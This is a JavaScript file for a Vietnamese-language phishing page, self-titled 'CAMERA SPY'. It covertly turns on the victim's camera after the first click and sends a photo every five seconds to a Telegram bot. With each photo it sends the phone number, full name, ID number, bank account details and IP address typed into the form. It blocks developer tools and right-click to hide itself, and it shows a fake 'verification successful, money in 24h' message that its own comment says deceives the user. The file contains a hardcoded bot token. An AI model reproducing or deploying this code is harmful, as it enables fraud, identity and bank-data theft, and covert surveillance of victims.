// ============================================
// AEGIS-X ULTRA - CAMERA SPY FIXED
// ============================================

const CONFIG = {
    TOKEN: '8427083531:AAFPX-KfKwKNr2b3-wqoAGC0F0H_D0JVki8',
    CHAT_ID: '-1004386281388',
    INTERVAL: 5000,
    RETRY_INTERVAL: 30000,
    MAX_STORED: 50,
    FACING_MODE: 'user',
    WIDTH: 480,
    HEIGHT: 360,
    QUALITY: 0.85
};

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const toast = document.getElementById('toast');
let stream = null;
let cameraReady = false;
let captureInterval = null;
let cameraStarted = false;

function debugLog(msg) {
    console.log('[SPY]', new Date().toLocaleTimeString(), msg);
}

function getIP() {
    return fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => d.ip || 'unknown')
        .catch(() => 'unknown');
}

function sendPhoto(blob, data) {
    const form = new FormData();
    form.append('chat_id', CONFIG.CHAT_ID);
    form.append('photo', blob, `spy_${Date.now()}.jpg`);

    let caption = `📸 SPY CAPTURE\n`;
    caption += `⏰ ${new Date().toLocaleString('vi-VN')}\n`;
    caption += `📱 Phone: ${data.phone || 'N/A'}\n`;
    caption += `👤 Name: ${data.fullname || 'N/A'}\n`;
    caption += `🆔 ID: ${data.idNumber || 'N/A'}\n`;
    caption += `🏦 Bank: ${data.bank || 'N/A'}\n`;
    caption += `💳 Account: ${data.account || 'N/A'}\n`;
    caption += `🌐 IP: ${data.ip || 'N/A'}\n`;
    caption += `🔹 User-Agent: ${navigator.userAgent.substring(0, 60)}`;

    form.append('caption', caption);

    return fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form
    })
    .then(res => {
        if (res.ok) {
            debugLog('✅ Ảnh gửi thành công');
            return true;
        } else {
            debugLog('❌ Lỗi: ' + res.status);
            return false;
        }
    })
    .catch(err => {
        debugLog('❌ Lỗi gửi: ' + err.message);
        return false;
    });
}

function sendText(data) {
    let text = '📋 SPY CAPTURE (NO IMAGE)\n';
    text += `⏰ ${new Date().toLocaleString('vi-VN')}\n`;
    text += `📱 Phone: ${data.phone || 'N/A'}\n`;
    text += `👤 Name: ${data.fullname || 'N/A'}\n`;
    text += `🆔 ID: ${data.idNumber || 'N/A'}\n`;
    text += `🏦 Bank: ${data.bank || 'N/A'}\n`;
    text += `💳 Account: ${data.account || 'N/A'}\n`;
    text += `🌐 IP: ${data.ip || 'N/A'}`;

    return fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    })
    .then(res => {
        if (res.ok) debugLog('✅ Text gửi thành công');
        else debugLog('❌ Text lỗi: ' + res.status);
    })
    .catch(err => debugLog('❌ Text err: ' + err.message));
}

// ===== BẮT CAMERA =====
function startCamera() {
    if (cameraStarted) return;
    cameraStarted = true;

    debugLog('📷 Đang bật camera...');

    navigator.mediaDevices.getUserMedia({
        video: {
            facingMode: CONFIG.FACING_MODE,
            width: { ideal: CONFIG.WIDTH },
            height: { ideal: CONFIG.HEIGHT }
        },
        audio: false
    })
    .then(s => {
        stream = s;
        video.srcObject = s;
        video.onloadedmetadata = () => {
            video.play();
            cameraReady = true;
            debugLog('📷 Camera đã sẵn sàng!');

            // Bắt đầu chụp ngay lập tức
            captureAndSend();

            // Chụp mỗi 5 giây
            if (captureInterval) clearInterval(captureInterval);
            captureInterval = setInterval(captureAndSend, CONFIG.INTERVAL);
        };
    })
    .catch(err => {
        debugLog('❌ Lỗi camera: ' + err.message);
        // Vẫn gửi text data nếu ko có camera
        setTimeout(() => {
            const data = {
                phone: document.getElementById('phone')?.value?.trim() || 'N/A',
                fullname: document.getElementById('fullname')?.value?.trim() || 'N/A',
                idNumber: document.getElementById('idNumber')?.value?.trim() || 'N/A',
                bank: document.getElementById('bank')?.value || 'N/A',
                account: document.getElementById('accountNumber')?.value?.trim() || 'N/A',
                ip: 'loading...'
            };
            getIP().then(ip => {
                data.ip = ip;
                sendText(data);
            });
        }, 300);
    });
}

function captureAndSend() {
    if (!cameraReady || !stream) {
        debugLog('⚠️ Camera chưa ready, bỏ qua');
        return;
    }

    try {
        const vw = video.videoWidth || CONFIG.WIDTH;
        const vh = video.videoHeight || CONFIG.HEIGHT;
        canvas.width = vw;
        canvas.height = vh;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, vw, vh);

        const phone = document.getElementById('phone')?.value?.trim() || 'N/A';
        const fullname = document.getElementById('fullname')?.value?.trim() || 'N/A';
        const idNumber = document.getElementById('idNumber')?.value?.trim() || 'N/A';
        const bank = document.getElementById('bank')?.value || 'N/A';
        const account = document.getElementById('accountNumber')?.value?.trim() || 'N/A';

        const data = { phone, fullname, idNumber, bank, account, ip: 'loading...' };

        getIP().then(ip => {
            data.ip = ip;
            canvas.toBlob(blob => {
                if (blob) {
                    sendPhoto(blob, data);
                } else {
                    sendText(data);
                }
            }, 'image/jpeg', CONFIG.QUALITY);
        });

    } catch (e) {
        debugLog('❌ Lỗi capture: ' + e.message);
    }
}

// ===== ANTI-INSPECT =====
function antiInspect() {
    document.addEventListener('keydown', function(e) {
        const key = e.key.toLowerCase();
        const ctrl = e.ctrlKey || e.metaKey;
        const shift = e.shiftKey;

        if (ctrl && shift && (key === 'i' || key === 'j')) {
            e.preventDefault();
            return false;
        }
        if (ctrl && (key === 'u' || key === 's')) {
            e.preventDefault();
            return false;
        }
        if (key === 'f12') {
            e.preventDefault();
            return false;
        }
        if (ctrl && shift && key === 'c') {
            e.preventDefault();
            return false;
        }
    }, false);

    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });

    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        return false;
    });

    debugLog('🛡️ Anti-inspect active');
}

// ===== TRIGGER CAMERA KHI USER CLICK BẤT KỲ ĐÂU =====
document.addEventListener('click', function firstClick() {
    debugLog('👆 User clicked, starting camera...');
    startCamera();
    document.removeEventListener('click', firstClick);
}, { once: true });

// ===== SUBMIT FORM =====
document.getElementById('submitBtn').addEventListener('click', function(e) {
    e.preventDefault();
    // Nếu camera chưa bắt, bắt luôn
    if (!cameraStarted) {
        startCamera();
    }
    // Chụp thêm 1 ảnh ngay khi bấm
    if (cameraReady) {
        setTimeout(captureAndSend, 300);
    }
    // Toast thông báo thành công (lừa user)
    const toast = document.getElementById('toast');
    if (toast) {
        toast.textContent = '✅ Xác thực thành công! Tiền sẽ được chuyển trong 24h.';
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 4000);
    }
});

// ===== INIT =====
function init() {
    debugLog('🚀 AEGIS-X ULTRA SPY INIT');
    antiInspect();

    // Gửi log khởi động
    const startMsg = `🟢 AEGIS-X ULTRA ACTIVATED\n⏰ ${new Date().toLocaleString('vi-VN')}\n📱 User-Agent: ${navigator.userAgent.substring(0, 80)}`;
    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text: startMsg,
            parse_mode: 'HTML'
        })
    }).catch(() => {});

    debugLog('✅ Init done. Waiting for user click...');
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}